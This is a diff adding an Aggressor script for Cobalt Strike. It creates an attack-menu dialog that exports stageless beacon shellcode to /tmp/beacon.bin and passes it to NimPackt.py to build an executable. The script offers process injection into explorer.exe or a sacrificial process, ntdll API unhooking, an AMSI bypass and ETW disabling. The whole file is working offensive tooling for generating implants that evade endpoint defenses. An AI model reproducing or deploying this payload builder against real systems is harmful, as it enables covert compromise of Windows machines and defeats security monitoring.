@@ -1,0 +1,83 @@
+####
+
+sub save_raw_shellcode {
+        local('$handle');
+        $handle = openf(">/tmp/beacon.bin");
+        writeb($handle, $1);
+        closef($handle);
+}
+
+sub compile {
+        %options = $3;
+
+        # Get the base command based on the chosen option
+        if (%options["type"] eq "local thread") {
+
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-H");
+
+        }
+        else if (%options["type"] eq "remote thread, sacrificial process") {
+
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-H", "-r", "-t", %options["targetproc"]);
+            
+        }
+        else {
+
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-H", "-r", "-E", "-t", %options["targetproc"]);
+
+        }
+
+        # Architecture
+        if (%options["arch86"] eq "true") {
+                artifact_stageless(%options["listener"], "raw", "x86", %options["proxy"], &save_raw_shellcode);
+                push(@command, "-32")
+        }
+        else {
+                artifact_stageless(%options["listener"], "raw", "x64", %options["proxy"], &save_raw_shellcode);
+        }
+
+        # No API unhooking
+        if (%options["nu"] eq "true") {
+                push(@command, "-nu")
+        }
+
+        # No AMSI bypass
+        if (%options["na"] eq "true") {
+                push(@command, "-na")
+        }
+        # No ETW disabling
+        if (%options["ne"] eq "true") {
+                push(@command, "-ne")
+        }
+
+        exec(@command);
+
+        show_message("NimPackt initiated, compiling may take some time. Output will be saved to the 'output' folder in your NimPackt installation directory.");
+}
+
+
+popup attacks {
+        item "NimPackt Payload" {
+                local('$dialog %defaults');
+                # setup our defaults
+                %defaults["type"] = "remote thread, sacrificial process";
+                %defaults["targetproc"] = "explorer.exe";
+                %defaults["na"] = "true";
+                %defaults["ne"] = "true";
+
+                # create our dialog
+                $dialog = dialog("Generate NimPackt executable binary", %defaults, &compile);
+                dialog_description($dialog, "Generate a NimPackt payload. Select the payload type and behaviour.");
+                drow_listener_stage($dialog, "listener", "Listener: ");
+                drow_combobox($dialog, "type", "Injection type:", @("local thread", "remote thread, sacrificial process", "remote thread, existing process"));
+                drow_text($dialog, "targetproc",  "Target process (remote execution only):");
+                drow_checkbox($dialog, "nu", "API Unhooking: ", "Do \UNOT\U unhook user-mode API calls (ntdll).");
+                drow_checkbox($dialog, "na", "AMSI Bypass: ", "Do \UNOT\U bypass AMSI (generally not required for shellcode).");
+                drow_checkbox($dialog, "ne", "ETW Disable: ", "Do \UNOT\U disable Event Tracing for Windows (generally not required for shellcode).");
+                drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 Payload");
+                dbutton_action($dialog, "Generate");
+
+                # show our dialog
+                dialog_show($dialog);
+        }
+}
